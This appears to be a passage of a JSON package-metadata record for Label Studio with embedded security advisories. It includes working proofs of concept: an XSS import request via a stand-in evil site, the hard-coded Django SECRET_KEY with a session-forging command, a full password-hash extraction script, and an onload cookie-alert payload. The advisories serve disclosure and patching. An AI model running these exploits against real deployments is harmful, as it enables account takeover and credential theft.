file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.4.6":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.4.6/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.2.4)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (==4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","murmurhash (==1.0.2)","numpy (==1.17.4)","plac (==0.9.6)","preshed (==2.0.1)","python-dateutil (==2.8.1)","python-json-logger (==0.1.11)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.9)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.4.6","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"7fa090836fd7e7d3fe0e6ccb0033390a3a8c6cdcf9d1ef53143b03f576d1b136","md5":"ed7ba458734e65deca8d5149d89e14a2","sha256":"b0a8c2f20fb89f1819dcb78e53e35d7905b45d301fc97f9a873671a4be94dfce"},"downloads":-1,"filename":"label_studio-0.4.6-py3-none-any.whl","has_sig":false,"md5_digest":"ed7ba458734e65deca8d5149d89e14a2","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":7313430,"upload_time":"2020-02-07T18:31:01","upload_time_iso_8601":"2020-02-07T18:31:01.141538Z","url":"https://files.pythonhosted.org/packages/7f/a0/90836fd7e7d3fe0e6ccb0033390a3a8c6cdcf9d1ef53143b03f576d1b136/label_studio-0.4.6-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"87c09886f91d91da892af686372a24aa8b96c876934bac95c2232ac39c4c3f30","md5":"a3abf9c61c0dcca6681ece835d837638","sha256":"f51e78fb310a00ef101c84ca8950b6d666949b826839d4c05106fac85c998354"},"downloads":-1,"filename":"label-studio-0.4.6.tar.gz","has_sig":false,"md5_digest":"a3abf9c61c0dcca6681ece835d837638","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":7243091,"upload_time":"2020-02-07T18:31:18","upload_time_iso_8601":"2020-02-07T18:31:18.366892Z","url":"https://files.pythonhosted.org/packages/87/c0/9886f91d91da892af686372a24aa8b96c876934bac95c2232ac39c4c3f30/label-studio-0.4.6.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before 